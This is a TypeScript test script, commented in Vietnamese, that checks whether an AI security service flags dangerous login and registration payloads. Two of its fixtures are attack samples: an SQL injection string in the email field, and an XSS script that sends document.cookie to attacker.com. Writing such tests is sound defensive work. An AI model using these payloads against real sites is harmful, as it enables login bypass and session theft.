import { AiSecurityService, type Logger } from './application/ai/ai-security.service.js';

// Khởi tạo Mock Logger để in kết quả ra terminal
const mockLogger: Logger = {
  debug: (msg: string) => console.log(`[DEBUG] ${msg}`),
  warn: (obj: Record<string, unknown>, msg: string) => console.warn(`[WARN] ${msg}`, obj),
  error: (obj: Record<string, unknown>, msg: string) => console.error(`[ERROR] ${msg}`, obj),
};

async function runTest() {
  console.log('=== KHỞI ĐỘNG KIỂM THỬ AI SECURITY SERVICE ===\n');
  const service = new AiSecurityService(mockLogger);

  // 1. Kiểm thử Payload An Toàn (SAFE)
  console.log('--- 1. Gửi request đăng nhập HỢP LỆ (SAFE) ---');
  const safePayload = {
    email: 'user@morningmist.com',
    password: 'SecurePassword123!',
  };
  await service.auditPayloadAsync('/login', '127.0.0.1', safePayload);
  console.log('✅ Đã chạy xong kiểm tra SAFE payload. (Không được có log [ERROR])\n');

  // 2. Kiểm thử Payload Tấn công SQL Injection (DANGEROUS)
  console.log('--- 2. Gửi request tấn công SQL Injection (DANGEROUS) ---');
  const sqlInjectionPayload = {
    email: "admin@morningmist.com' OR '1'='1",
    password: 'anything',
  };
  await service.auditPayloadAsync('/login', '192.168.1.100', sqlInjectionPayload);
  console.log('✅ Đã chạy xong kiểm tra SQL Injection.\n');

  // 3. Kiểm thử Payload Tấn công XSS (DANGEROUS)
  console.log('--- 3. Gửi request tấn công XSS (DANGEROUS) ---');
  const xssPayload = {
    email: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
    password: 'password',
  };
  await service.auditPayloadAsync('/register', '10.0.0.5', xssPayload);
  console.log('✅ Đã chạy xong kiểm tra XSS.\n');

  console.log('=== KẾT THÚC KIỂM THỬ ===');
}

runTest().catch((err) => {
  console.error('Lỗi khi chạy script kiểm thử:', err);
});
